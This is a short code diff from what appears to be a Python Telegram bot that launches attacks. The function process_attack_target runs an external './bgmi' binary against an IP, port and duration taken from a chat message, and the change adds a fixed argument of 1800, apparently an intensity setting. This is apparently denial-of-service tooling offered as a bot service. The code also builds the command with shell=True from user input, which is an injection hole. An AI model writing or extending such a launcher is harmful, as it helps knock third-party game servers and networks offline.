@@ -457,7 +457,7 @@ def process_attack_target(message):
     del pending_attacks[chat_id]
 
     # Build and execute the attack command.
-    command_line = f"./bgmi {ip} {port} {duration_seconds}"
+    command_line = f"./bgmi {ip} {port} {duration_seconds} 1800"
     try:
         subprocess.Popen(command_line, shell=True)
         bot.send_message(
